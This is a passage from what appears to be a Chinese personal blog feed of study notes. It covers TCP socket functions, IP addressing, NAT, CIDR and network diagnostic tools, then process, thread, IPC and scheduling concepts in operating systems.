</span>;</span><br></pre></td></tr></table></figure><p>函数的三个参数分别为：</p><ol><li><p>sockfd：即套接字，它是通过socket()函数创建的，它唯一标识一个套接口。</p></li><li><p>addr：一个指向特定于协议的地址结构的指针。</p></li><li><p>addrlen：指出第二个参数中结构体的长度。</p></li></ol><p>通常服务器在启动的时候都会绑定一个众所周知的地址(如IP地址+端口号)，用于提供服务，客户就可以通过它来连接服务器；而客户端就不用指定，由系统自动分配一个端口号和自身的IP地址组合。**&#x3D;&#x3D;这就是什么三次握手时为服务器端在listen之前会调用bind，而客户端就不调用，而是在connect时由系统生成一个。&#x3D;&#x3D;**</p></li><li><p><strong>listen()函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> backlog)</span></span></span><br></pre></td></tr></table></figure><p>listen函数仅由TCP服务器调用，它做两件事情：</p><ol><li><p>当socket函数创建一个套接口时，它被假设为一个主动套接口，也就是说，它默认是一个将调用connect发起连接的客户套接口。listen函数把一个未连接的套接口<strong>转换成一个被动套接口</strong>，指示内核应接受指向该套接口的连接请求。调用listen导致套接口从CLOSED状态转换到LISTEN状态。</p></li><li><p>listen函数的<strong>第二个参数backlog规定了内核应该为相应套接口排队的最大连接个数</strong>（后台等待连接队列的最大限制值）(包括已完成连接队列与未完成连接队列)。</p></li></ol><ul><li><p>未完成连接队列。</p><p>每个这样的客户对应其中- -项:客户已经发出建立连接请求，且请求已到达服务器，而服务器正在等待完成相应的TCP三路握手过程(服务器已发出第二个分节，等待客户端的第三个分节)。这些套接字处于SYN_ RCVD状态。</p></li><li><p>已完成连接队列。</p><p>每个已完成TCP三路握手过程的客户对应其中- -项。这些套接字处于ESTABLISHED状态。</p></li></ul></li><li><p><strong>connect()函数</strong></p><p>TCP客户用connect函数来<strong>建立与TCP服务器的连接</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">connect</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>connect函数的第一个参数即为客户端的套接字，第二参数为一个指向套接口地址结构的指针，第三个参数为第二个参数中结构体的长度。</p></li><li><p><strong>accept()函数</strong></p><p>accept函数由TCP服务器调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">accept</span> <span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr addr, <span class="type">socklen_t</span> addrlen)</span> </span>;</span><br></pre></td></tr></table></figure><p>accept函数的第一个参 数为服务器的套接字，第二个参数用于返回客户端的协议地址，第三个参数为协议地址的长度。</p><p>如果accept成功，那么其返回值是由内核自动生成的<strong>一个全新的描述字</strong>，代表与所返回客户的TCP连接。</p></li><li><p><strong>close()函数</strong></p><p>close函数用来关闭套接口，并终止TCP连接。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">close</span><span class="params">(<span class="type">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>close一个TCP套接口的默认行为是把该套接口标记为已关闭，然后立即返回到调用进程。<strong>该套接字<u>不能再由调用进程使用</u><strong>，也就是说不能再作为read或write的第-一个参数。<br>注意：close操作</strong>只是使相应套接字的引用计数减1</strong>，<u>只有当引用计数为0的时候，才会触发TCP客户端向服务器发送终止连接请求</u>（激发TCP的正常连接终止序列,即发送FIN)）。</p></li><li><p><strong>shutdown()函数</strong></p><p>关闭一个socket有2种方法，分别是close与shutdown。</p><p>shutdown函数的原型是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">shutdown</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> howto)</span></span>;</span><br></pre></td></tr></table></figure><p>sockfd是需要关闭的套接口描述字。参数howto允许为shutdown操作选择以下几种方式:</p><p>SHUT_RD：关闭连接的读端。也就是该套接字不再接收数据，任何当前在套接字接收缓冲区的数据将被丢弃，但仍可写。进程将不能对该套接字发出任何读操作。调用之后接收到的任何数据将被确认然后无声丢弃掉。注意此时并不发送FIN。</p><p>SHUT_WR：关闭连接的写端，进程不能再对此套接字发出写操作，但仍可读。对于TCP的套接字(socket)， 这称为半关闭，当前留在套接字发送缓冲区中的数据将被发送掉。不管套接字的引用计数是否等于0,关闭写端的操作都会执行，即会发送FIN。</p><p>SHUT_ RDWR：相当于调用shutdown两次：第一次指定howto为SHUT_ RD，第二次指定howto为SHUT_WR。</p><p><strong>&#x3D;&#x3D;close和shutdown的区别：&#x3D;&#x3D;</strong></p><ul><li>close 会关闭连接，并释放所有连接对应的资源，**套接字<u>不能再由调用进程使用</u>**，即它不能再作为read或write的参数；而 shutdown 并不会释放掉套接字和所有的资源，关闭读仍然可以write，关闭写仍然可以read。</li><li><strong>close 存在引用计数</strong>的概念，调用时把套接字的引用计数减1，<strong>仅在该计数变为0时才关闭套接字</strong>；<strong>shutdown 则不管引用计数，直接使得该套接字不可用</strong>，如果有别的进程企图使用该套接字，将会受到影响。</li><li>close 的引用计数导致<strong>不一定会发出 FIN 结束报文</strong>，而 <strong>shutdown 则总是会发出 FIN 结束报文</strong>，这在我们打算关闭连接通知对端的时候，是非常重要的。</li><li><strong>close函数同时终止两个方向的数据传送：读和写。shutdown可以只终止一个方向的数据传送。</strong></li></ul></li><li><p><strong>TCP的半关闭</strong></p><p>TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。这就是所谓的半关闭，<strong>半关闭是通过调用shutdown函数代替close函数实现的</strong>。</p><p>图2-7显示了一个半关闭的典型例子。让左方的客户端开始半关闭，当然也可以由另一端开始。开始的两个报文和四次挥手一致，初始端发出FIN，接着是另一端对这个FIN的ACK报文段。但后面就和四次挥手不同，因为接收半关闭的一方仍能发送数据。我们只显示一个数据报文段和一个ACK报文段，但可能发送了许多数据报文段。当收到半关闭的一端在完成它的数据传送后， 将发送一个 FIN<br>关闭这个方向的连接，这将传送一个文件结束符给发起这个半关闭的应用进程。当对第二个FIN进行确认后，这个连接便彻底关闭了。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704181311157.png" alt="image-20220704181311157"></p><p>终止网络连接的通常方法是调用close 函数。不过&#x3D;&#x3D;<strong>close有两个限制</strong>，通常可使用shutdown 函数来避免&#x3D;&#x3D;。</p><ul><li><p><strong>close无法直接终止连接</strong></p><p>close函数把套接字的引用计数减1，<strong>仅在该计数变为0时才关闭套接字</strong>。</p><p>使用shutdown（howto参数为SHUT_RDWR或SHUT_WR时）可以<strong>不管引用计数就激发TCP的正常连接终止序列</strong>。</p></li><li><p><strong>close只能同时终止两个方向的数据传送</strong></p><p>close 函数<strong>同时终止数据传送的两个方向：读和写</strong>。</p><p>但是TCP连接是全双工的，有时候我们需要关闭写但仍然可以继续读，shutdown 函数可以完成此工作。</p></li></ul><p>&#x3D;&#x3D;<strong>注意：</strong>&#x3D;&#x3D;</p><ol><li><p>如果有多个进程共享一个套接字，close 每被调用一次，计数减1，直到计数为0时，也就是所有进程都调用了close, 套接字将被释放。</p></li><li><p>在多进程中，如果一个进程调用shutdown(fd, SHUT_ RDWR)后其他的进程将无法利用此套接字进行通信。如果一个进程调用close(sfd)将不会影响到其他进程。</p></li></ol></li></ol><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="3-1-IPv4地址及网络地址转换NAT"><a href="#3-1-IPv4地址及网络地址转换NAT" class="headerlink" title="3.1 IPv4地址及网络地址转换NAT"></a>3.1 IPv4地址及网络地址转换NAT</h3><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p>连接在Internet的每台主机&#x2F;路由器都分配一个<strong>32bit</strong>的全球唯一的标识符。</p><p>IP地址的编码方式有三种：分类的IP地址、子网的划分、CIDR。</p><ul><li><p>分类的IP地址</p><p>传统的IP地址是分类的地址，分为A、B、C、D、E五类。均由网络号和主机号组成，网络号代表主机所连接到的网络，主机号代表该主机或路由器在网络中的地址。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220705093309767.png" alt="image-20220705093309767"></p><p>其中，存在一些特殊的IP地址用于表示特殊用途，不作为主机IP地址：</p><ul><li>主机号全为0表示本网络本身；</li><li>主机号全为1表示本网络的广播地址；</li><li>127.0.0.1网路保留作为环路自检地址，表示任意主机本身；</li><li>32bit全为0，即0.0.0.0表示整个TCP&#x2F;IP网络；</li><li>32bit全为1，即255.255.255.255表示整个TCP&#x2F;IP网络的广播地址。</li></ul></li><li><p>子网的划分、CIDR在下一节叙述。</p></li></ul><h4 id="网络地址转换"><a href="#网络地址转换" class="headerlink" title="网络地址转换"></a>网络地址转换</h4><p>网络地址转换（NAT）是通过将专用网络地址（比如企业内部网Intranet）转换为公用地址（如互联网Internet），从而对外隐藏了内部管理的IP地址。通过在内部使用非注册的IP地址（私有地址），并将它们转换为一小部分外部注册的IP地址（公有地址），从而减少IP地址注册的费用以及节省IPv4地址空间。</p><p>私有IP地址值用于局域网LAN，不用于无线局域网WLAN连接。因此私有IP地址不能直接用于Internet，必须通过网关利用NAT把私有IP地址转换为Intemet中合法的全球IP地址后才能用于Intermet。私有IP地址有效地解决了IP地址不足的问题。</p><p>私有IP地址网段如下:</p><blockquote><p><strong>10.0.0.0~10.255.255.255</strong>、<strong>172.16.0.0~172.31.255.255</strong>、 <strong>192.168.0.0~192.168.255.255</strong></p></blockquote><p>在因特网中的所有路由器，对目的地址是私有地址的数据报一律不进行转发。 使用NAT时，需要在专用网连接到因特网的路由器上安装NAT软件，NAT路由器至少有一个有效的外部全球地址。普通路由器在转发数据报时不改变其源IP地址和目的IP地址，且路由器工作在网络层，而<strong>NAT路由器在转发IP数据报时，一定要更换其IP地址（按路由器中的地址转换表转换源IP地址或目的IP地址）。NAT路由器转发数据报时需要查看和转换传输层的端口，其操作没有严格的层次关系</strong>。</p><h3 id="3-2-子网划分与子网掩码、CIDR"><a href="#3-2-子网划分与子网掩码、CIDR" class="headerlink" title="3.2 子网划分与子网掩码、CIDR"></a>3.2 子网划分与子网掩码、CIDR</h3><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><p>各类地址的默认子网掩码：</p><p><strong>A类: 255.0.0.0</strong><br><strong>B类: 255.255.0.0</strong><br><strong>C类: 255.255.255.0</strong></p><p>使用子网划分时的地址格式：</p><p><strong>A类网络：8位    +  子网X位  +  主机24-X位</strong><br><strong>B类网络：16 位 +  子网X位  +  主机16-X位</strong><br><strong>C类网络：24位  +  子网X位  +  主机8-X位</strong></p><h4 id="无分类编址CIDR"><a href="#无分类编址CIDR" class="headerlink" title="无分类编址CIDR"></a>无分类编址CIDR</h4><p><strong>分类的IP地址的缺点：</strong></p><p>比如一个A类地址对应的是2^24 - 2个IP地址(网络地址和广播地址)，这个是个天文数字，一个公司或者组织是无法完全利用这么多IP地址的，就造成了IP地址的浪费。</p><p><strong>CIDR</strong>是在使用变长度子网掩码的基础上提出的一种消除传统A、B、C类网络划分，并且可以在软件的支持下实现超网构造的一种IP地址的网络划分方法。这样可以大幅度提高IP地址空间的利率，并减小路由表大小，提高路由器的路由转发能力。</p><p>无分类编址的做法是将IP分为两部分：</p><p>1、<strong>网络前缀</strong></p><p>网络号对应的是一个网络地址，一个网络可以容纳多个主机，主机的网络号相同。</p><p>2、<strong>主机号</strong></p><p>唯一标识一个主机在一个网络中的id。</p><p>怎么区分网络号和主机号呢？</p><p>使用斜线记法，即IP地址&#x2F;网络前缀所占比特数，xx:xx:xx:xx&#x2F;n<br>在IP地址后边加入了 &#x2F;n ，n代表前n位为网络号。</p><p>CIDR的主要特点：</p><ol><li><p>消除了传统的A、B、C类地址以及子网的概念，因而可以<strong>更加有效地分配IPv4的地址空间</strong>。CIDR使用“网络前缀”概念代替子网络概念。这样IP地址分为两部分:网络前缀、主机号。CIDR使用斜线记法，即IP地址&#x2F;网络前缀所占比特数。其中，网络前缀所占比特数对应于网络<br>的部分，等效于子网掩码中连续1的部分。</p></li><li><p>将网络前缀都相同的连续的IP地址组成“CIDR地址块”。一个CIDR地址块可以包括多个A、B、C类地址，这种地址的聚合称为<strong>路由聚合</strong>，或称为构成<strong>超网</strong>。路由聚合<strong>使得路由表中的一个项目可以表示很多个原来传统分类地址的路由</strong>，有利于减少路由之间的路由选择信息的交换，从而提高网络性能。</p></li></ol><h3 id="3-3-ARP、RARP、ICMP"><a href="#3-3-ARP、RARP、ICMP" class="headerlink" title="3.3 ARP、RARP、ICMP"></a>3.3 ARP、RARP、ICMP</h3><ul><li><p><strong>ARP</strong></p><p>在实际网络的数据链路上传送数据时，最终必须使用硬件地址MAC。所以需要一种方法来<strong>完成IP地址址到MAC地址的映射</strong>，这就要用到地址解析协议(Address Resolution Protocol, ARP)。 <strong>每台主机(路由器) 上单独地存放一个从IP地址到MAC地址的映射表，称为ARP表</strong>。主机和路由器使用地址解析协议APR来<strong>动态维护此ARP表</strong>。MAC地址转换为IP地址使用RARP协议。</p></li><li><p><strong>ICMP</strong></p><p>为了提高IP数据报成功交付的机会，在网络层使用了网际控制报文协议(Internet Control Message Protocol, ICMP) 来使得主机或路由器可以报告差错和异常情况。<br><strong>PING命令工作在应用层</strong>，但是<strong>直接使用网络层的ICMP协议</strong>，而**<u>没有使用传输层的TCP或UDP协议</u>**。</p></li></ul><h3 id="3-4-IPv6"><a href="#3-4-IPv6" class="headerlink" title="3.4 IPv6"></a>3.4 IPv6</h3><p>IPv6由<strong>128bit</strong>构成,通常使用冒号十六进制记法表示IPv6地址，每个16bit的值用四位十六进制值表示，各值之间用冒号分割，如68E6 : 8C64 : FFFFF : 0 : 1180 : 960A : FFFF。该表示方法允许使用零压缩，即一连串连续的零可以为一对冒号所取代，如DE08:0:0:0:0:0:0:B3可以写成DE08::B3；IP 地址0:0:0:0:0:0:118.17.23.1可以写成::118.17.23.1。（这里冒号分割的是16bit，点分割的是8bit）</p><p>IPv6所引入的主要变化：</p><ol><li>更大的地址空间。IPv6 将地址从IPv4的32bit增大到了128bit；</li><li>扩展的地址层次结构。</li><li>灵活的首部格式。</li><li>改进的选项。这一特征加快了分组处理速度。</li><li>允许协议继续扩充。</li><li>支持即插即用。</li><li>支持资源的预分配。</li><li>增加了安全性，身份验证和保密验证是IPv6的关键特征。</li><li>分片限制为由源点来完成，是端到端的，路由途中的路由器不允许进行分片。</li></ol><h2 id="网络常用测试工具"><a href="#网络常用测试工具" class="headerlink" title="网络常用测试工具"></a>网络常用测试工具</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>检查网络是否通畅或者网络的连接速度。</p><p>原理：利用网络上机器<strong>IP地址的唯一性</strong>，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通、时延是多少。</p><h3 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h3><p>tracert是路由跟踪实用程序，<strong>用于确定IP数据包访问目标所采取的路径</strong>。</p><p>tracert 命令用<strong>IP生存时间(TTL) 字段</strong>和<strong>ICMP错误消息</strong>来确定从一个主机到网络上其他主机的路由。其命令格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert[-d] [-h maximum hops] [-j computer-list] [-W timeout] target_name</span><br></pre></td></tr></table></figure><p>可以使用tracert命令确定数据包在网络上的停止位置。例如：<code>tracert www.baidu.com</code>则会打印出从当前主机到目的主机所经过的路由地址。</p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>查看某个端口是否可访问。Telnet协议是TCP&#x2F;IP协议家族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。</p><p>例如<strong>可以用telnet测试80端口的Web服务器是否正常工作</strong>。</p><p>输入<code>telnet www .hitsz.edu.cn 80</code></p><p>然后服务器响应:<br><code>Trying 219.223.252.3...</code><br><code>Connected to www .hitsz .edu. cn</code><br><code>Escape character is &#39;^] .</code></p><p>然后输入:<br><code>GET / HTTP1.1</code></p><p>如果Web服务器正常工作的话，就会返回服务器的响应头，以便你确认服务器的情况。</p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>netstat是一个监控TCP&#x2F;IP网络的非常有用的工具，它可以<strong>显示路由表、实际的网络连接以及每一个网络接口设备的状态信息</strong>。</p><p>netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。使用格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat [-a][-e][-n][-o][-P Protocol] [-r] [-s] [Interval]</span><br></pre></td></tr></table></figure><p>一般用<code>netstat -an</code>来显示所有连接的端口并用数字表示。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机网络&quot;&gt;&lt;a href=&quot;#计算机网络&quot; class=&quot;headerlink&quot; title=&quot;计算机网络&quot;&gt;&lt;/a&gt;计算机网络&lt;/h1&gt;&lt;h2 id=&quot;计算机网络模型&quot;&gt;&lt;a href=&quot;#计算机网络模型&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>操作系统</title>
    <link href="https://frankcao3.github.io/posts/1079"/>
    <id>https://frankcao3.github.io/posts/1079</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>进程是<strong>资源分配的基本单位</strong>（比如内存、打开的文件等），<strong>同一程序可产生多个进程（一对多关系）</strong>，以允许同时有多位用户运行同一程序，却不会相互冲突。进程需要一些资源才能完成工作，如CPU使用时间、存储器、文件以及IO设备，且为依序逐一进行，也就是任何时间内仅能运行一项进程。</p><p>通常进程有如下5种状态，其中前3种是进程的基本状态。</p><ol><li><p><strong>运行状态</strong>(执行窗台)：进程正在处理器上运行。在单处理器环境下，每一时刻最多只有一个进程处于运行状态。</p></li><li><p><strong>就绪状态</strong>：进程已处于准备运行的状态，即进程<strong>获得了除处理器之外的一切所需资源</strong>，一旦得到处理器即可运行。</p></li><li><p><strong>阻塞状态</strong>：又称为等待状态，进程正在等待某一事件而暂停运行，如等待某资源为可用(不包括处理器)或等待输入输出完成。即使处理器空闲，该进程也不能运行。</p></li><li><p><strong>创建状态</strong>：进程正在被创建，尚未转到就绪状态。</p></li><li><p><strong>结束状态</strong>：进程正从系统中消失。可能是进程正常结束或其他原因中断退出运行。</p></li></ol><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220706142135268.png" alt="image-20220706142135268"></p><p><em>进程的三个基本状态之间是可以相互转换的，如图1-1所示。</em></p><p>具体地说，当一个就绪进程<strong>获得处理机时</strong>，其状态<strong>由就绪变为执行</strong>；</p><p>当一个运行进程<strong>被剥夺处理机时</strong>，比如<u>用完系统分给它的时间片、出现更高优先级别的其他进程</u>，其状态<strong>由运行变为就绪</strong>；</p><p>当一个运行进程<strong>因某事件受阻时</strong>，如<u>所申请资源被占用、启动IO传输未完成</u>，其状态<strong>由执行变为阻塞</strong>；</p><p>当<strong>所等待事件发生时</strong>，如得到申请资源、IO传输完成，其状态<strong>由阻塞变为就绪</strong>。</p><p>&#x3D;&#x3D;<strong>进程与程序的区别：</strong>&#x3D;&#x3D;</p><ul><li><p>进程是动态的概念，而程序是静态的概念</p><p>进程是程序及其数据在计算机上的<strong>一次运行活动</strong>，是一个<strong>动态</strong>的概念。进程的运行实体是程序、离开程序的进程没有存在的意义。从静态角度看，**<u>进程是由程序、数据和进程控制块(PCB) 三部分组成的</u><strong>。而</strong>程序是一组有序的指令集合，是一种静态的概念**。</p></li><li><p>生存周期不同</p><p>进程是程序的一次执行过程，它是动态地创建和消亡的，具有一定的生命期，是暂时存在的；而程序则是一组代码的集合，它是永久存在的，可长期保存。</p></li><li><p>一个进程可以执行一个或几个程序，一个程序也可以构成多个进程。进程可创建进程，而程序不可能形成新的程序。</p></li><li><p>进程与程序的组成不同。</p><p>进程的组成包括程序、数据和进程控制块。</p><p>创建新进程时会创建新的地址空间：子进程是父进程的复制品，在fork 之后子进程<u><strong>获得父进程的数据空间、堆和栈的复制品</strong></u>，而线程使用当前的地址空间。</p></li></ul><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>或者叫做轻量级进程（Lightweight Process, LWP）, 是程序执行流的最小单元。</p><p>一个标准的线程由<strong>线程ID，当前指令指针(PC)，寄存器集合和堆栈(stack)</strong> 组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自已不拥有系统资源，只拥有一点在运行中必不可少的资源，但它<u><strong>可与同属一个进程的其他线程共享进程所拥有的资源（共享进程的内存地址空间），但拥有属于自己的栈空间以及独立的执行顺序</strong></u>。</p><p><strong>一、线程共享的进程环境</strong>包括：</p><p>进程代码段、进程的公有数据（如<u>全局变量</u>，利用这些共享的数据，线程很容易的实现相互之间的通信）、进程打开的文件描述符、信号的处理器、进程的当前目录和进程用户ID与进程组ID。</p><p><strong>二、线程自己的个性：</strong></p><p>拥有这许多共性的同时，还拥有自己的个性。有了这些个性，<strong>线程才能实现并发性</strong>。这些个性包括:</p><ol><li><p>线程ID</p><p>每个线程都有自己的线程ID，这个ID在本进程中是唯一的。 进程用此来标识线程。</p></li><li><p>寄存器组的值</p><p>由于线程间是并发运行的，每个线程有自已不同的运行线索，当从一个线程切换到另一个线程上时，必须<strong>将原有线程的寄存器集合的状态进行保存</strong>，以便将来该线程在被重新切换时能得以恢复。</p></li><li><p>线程的堆栈(stack)</p><p>堆栈是保证线程独立运行所必须的。线程函数可以调用函数，而被调用函数中又是可以层层嵌套的，所以<strong>线程必须拥有自己的函数堆栈</strong>，使得函数调用可以正常执行，不受其他线程的影响。<u><strong>在一个进程的线程共享堆区(heap)</strong></u>。</p></li><li><p>错误返回码</p></li><li><p>线程的信号屏蔽码</p></li><li><p>线程的优先级</p></li></ol><p><strong>一个线程可以创建和撤销另一个线程，同一进程中的多个线程之间可以并发执行</strong>。</p><p>由于线程之间的相互制约，致使线程在运行中呈现出间断性。线程也有就绪、阻塞和运行三种基本状态。每一个程序都至少有一个线程，若程序只有一个线程，那就是程序本身。线程是程序中一个单一的顺序控制流程。<strong>在单个程序中同时运行多个线程完成不同的工作，称为</strong><br><strong>多线程。</strong></p><p>引入线程后，进程的内涵发生了改变，<strong>进程只作为除CPU以外系统资源的分配单元，线程则作为处理器的分配单元。</strong>在同一进程中，线程的切换不会引起进程的切换，但从一个进程中的线程切换到另一个进程中的线程时，将会引起进程的切换。</p><p><strong>&#x3D;&#x3D;线程与进程的区别?&#x3D;&#x3D;</strong></p><ol><li><strong>调度</strong>：</li></ol><p>引入线程后，<u>线程是独立调度的基本单位</u>，<u>进程是资源分配的基本单位。</u>在同一进程中，线程的切换不会引起进程切换。在不同进程中进行的线程切换，则会引起进程切换。</p><ol start="2"><li><strong>拥有资源</strong>：</li></ol><p>进程是拥有资源的基本单位，线程不拥有资源(也有一点必不可少的资源)，但线程可以共享其隶属进程的系统资源。</p><ol start="3"><li><strong>并发性</strong>：<u>进程可以并发，同一进程内的多个线程也可以并发</u></li></ol><p>在引入线程的操作系统中，不仅进程可以并发执行，而且同一进程内的多个线程也可以并发执行，从而使操作系统具有更好的并发性，大大提高了系统吞吐量。</p><ol start="4"><li><strong>系统开销</strong>：<u>线程切换以及同步、通信的系统开销比进程小</u></li></ol><p>创建和撤销进程时，系统都要为之分配或回收资源，如内存空间、IO设备等，因此操作系统所付出的开销远大于创建或撤销线程的开销。类似地，在进程切换时，涉及当前执行进程CPU环境的保存以及新调度的进程CPU环境的设置；而线程切换时只需保存和设置少量寄存器内容，因此开销很小。</p><p>另外，由于同一进程内的多个线程共享进程的地址空间，因此这些线程之间的同步与通信比较容易实现，甚至无须操作系统的干预。</p><ol start="5"><li><strong>地址空间和其他资源</strong>（如打开的文件）：</li></ol><p><u>进程的地址空间之间互相独立，同一进程的各线程间共享进程的资源</u>，某进程内的线程对于其他进程不可见。</p><ol start="6"><li><strong>通信方面</strong>：</li></ol><p><u>进程间通信需要借助操作系统，而线程间可以直接读&#x2F;写进程数据段(如全局变量)来进行通信。</u></p><h3 id="进程通信与进程同步"><a href="#进程通信与进程同步" class="headerlink" title="进程通信与进程同步"></a>进程通信与进程同步</h3><p>多个进程可以共享系统中的各种资源，但其中许多资源一次只能为一个进程使用，我们把<u><strong>一次仅允许一个进程使用的资源称为临界资源</strong></u>。许多物理设备都属于临界资源，如打印机等。</p><p>对临界资源的访问，必须互斥的进行，**在每个进程中，访问临界资源的那段代码称为临界区(Critical Section)**。</p><p><em>进程通信与同步有如下一些目的：</em></p><p>1)数据传输：一个进程需要将它的数据发送给另一个进程;</p><p>2)共享数据： 多个进程想要操作共享数据，一个进程对共享数据的修改，别的进程应该立刻看到；</p><p>3)通知事件：一个进程需要向另一个或一组进程发送消息， 通知它(它们)发生了某种事件(如进程终止时要通知父进程);</p><p>4)资源共享：多个进程之间共享同样的资源。为了做到这一点， 需要内核提供<strong>锁和同步机制</strong>；</p><p>5)进程控制：有些进程希望完全控制另一个进程的执行(如Debug进程)，此时控制进程希望能够拦截另一个进程的所有陷入和异常，并能够及时知道它的状态改变。</p><p><strong>&#x3D;&#x3D;Linux下进程间通信的几种主要手段简介：&#x3D;&#x3D;</strong></p><ul><li><strong>管道(Pipe) 及有名管道(named pipe)</strong></li></ul><p><u>管道可用于具有亲缘关系进程间的通信</u>，有名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，<u>有名管道还允许无亲缘关系进程间的通信</u>;</p><ul><li><strong>信号(Signal)</strong></li></ul><p>信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；Linux 除了支持UNIX早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction；</p><ul><li><strong>Message (消息队列)</strong></li></ul><p>消息队列是消息的链表，包括Posix消息队列System V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。<u>消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。</u></p><ul><li><strong>共享内存</strong></li></ul><p><u>使得多个进程可以访问同一块内存空间，是最快的可用IPC（进程间通信）形式</u>。是针对其他通信机制运行效率较低而设计的。往往与其他通信机制，如信号量结合使用，来达到进程间的同步及互斥。</p><ul><li><strong>信号量(semaphore)</strong></li></ul><p>主要作为进程间以及同一进程不同线程之间的同步手段。</p><ul><li><strong>套接口(Socket)</strong></li></ul><p>更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由UNIX系统的BSD分支开发出来的，但现在一般可以移植到其他类UNIX系统上：Linux 和System V的变种都支持套接字。</p><p>**<u>Linux线程间通信</u>**：互斥体(互斥量)，信号量，条件变量。.</p><p>**<u>Windows进程间通信</u>**：管道、共享内存、消息队列、信号量、socket。</p><p>**<u>Windows线程间通信</u>**：临界区(Critical Section)、互斥量(Mutex)、信号量(信号灯) (Semaphore)、事件(Event)。</p><p>**&#x3D;&#x3D;临界区(Critical section)与互斥体(Mutex) 的区别&#x3D;&#x3D;**：</p><ol><li><p><u>临界区只能用来同步本进程内的线程</u>，而不可用来同步多个进程中的线程；互斥量(Mutex)，信号量(Semaphore)，事件(Event) 都可以被跨越进程使用来进行同步数据操作；</p></li><li><p><u>临界区是非内核对象，只在用户态进行锁操作，速度快</u>；互斥体是内核对象，在核心态进行锁操作，速度慢。</p></li><li><p>临界区和互斥体在Windows平台都下可用，<u>Linux下只有互斥体可用</u>。</p></li></ol><h3 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h3><p>调度的基本准则包括CPU利用率、系统吞吐量、周转时间、等待时间、响应时间等。</p><p><strong>系统吞吐量</strong>表示单位时间内CPU完成作业的数量。</p><p>&#x3D;&#x3D;<strong>周转时间</strong> &#x3D; 作业完成时刻 - 作业到达时刻&#x3D;&#x3D;</p><p>&#x3D;&#x3D;<strong>带权周转时间</strong> &#x3D; 周转时间 &#x2F; 所需服务时间&#x3D;&#x3D;</p><p><strong>等待时间</strong>是指进程处于等处理器状态的时间之和，等待时间越长，用户满意度越低。</p><p><strong>响应时间</strong>是指从用户提交请求到系统首次产生响应所用的时间。</p><p>典型调度算法包括：先来先服务算法(FCFS)、短作业优先算法(SJF)、优先级调度算法、高响应比优先调度算法、时间片轮转算法、多级反馈队列调度算法。<strong>其中SJF的平均等待时间、平均周转时间最少；最高响应比优先算法能兼顾短作业和长作业。</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220708102518420.png" 